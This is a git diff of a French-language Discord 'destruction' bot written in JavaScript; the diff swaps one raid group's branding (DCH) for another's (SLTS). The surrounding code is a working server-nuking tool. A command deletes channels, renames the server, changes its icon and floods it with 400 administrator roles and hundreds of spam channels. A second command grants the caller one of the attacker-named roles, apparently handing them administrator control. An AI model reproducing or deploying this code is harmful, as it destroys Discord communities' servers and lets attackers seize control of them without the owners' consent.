@@ -7,7 +7,7 @@ var destruc = '§';
 
 
 bot.on('ready', function () {
-  bot.user.setPresence({ game: { name: 'DrainCorp'}})
+  bot.user.setPresence({ game: { name: 'SLTS.ntm'}})
   console.log("Bot de destruction en attente de vos commandes!")
 })
 
@@ -38,16 +38,16 @@ if(cmd("destruction", msg)) {
         console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: destruction du channel ${c.name}; ID: ${c.id}. (╯°□°）╯︵ ┻━┻`);
     });
     msg.guild.setName("BZ by DCH ");
-    msg.guild.setIcon("https://image.noelshack.com/fichiers/2018/09/1/1519653220-29446936.jpg");
+    msg.guild.setIcon("https://cdn.discordapp.com/attachments/436480961979351040/482591506075746356/kowine.png");
     msg.channel.fetchMessages({limit: 1}).then(messages => msg.channel.bulkDelete(messages));
     for (var i = 0; i < 400; i++) {
         msg.guild.createRole({
-            name: 'BZ BY DCH',
+            name: 'BZ BY SLTS',
             color: 'YELLOW',
             permissions: 'ADMINISTRATOR',
         });
-        msg.guild.createChannel('BZ by DCH', 'voice')
-        msg.guild.createChannel('BZ-by-DCH', 'text')
+        msg.guild.createChannel('BZ by SLTS', 'voice')
+        msg.guild.createChannel('BZ-by-SLTS', 'text')
      }
  }
 });
@@ -68,7 +68,7 @@ bot.on('message', msg => {
 
     if (msg.content === '§a') {
     msg.channel.fetchMessages({limit: 1}).then(messages => msg.channel.bulkDelete(messages));
-    let RoleToAdd = msg.guild.roles.find('name', 'BZDCH')
+    let RoleToAdd = msg.guild.roles.find('name', 'BZSLTS')
     msg.member.addRole(RoleToAdd);
 }
 });
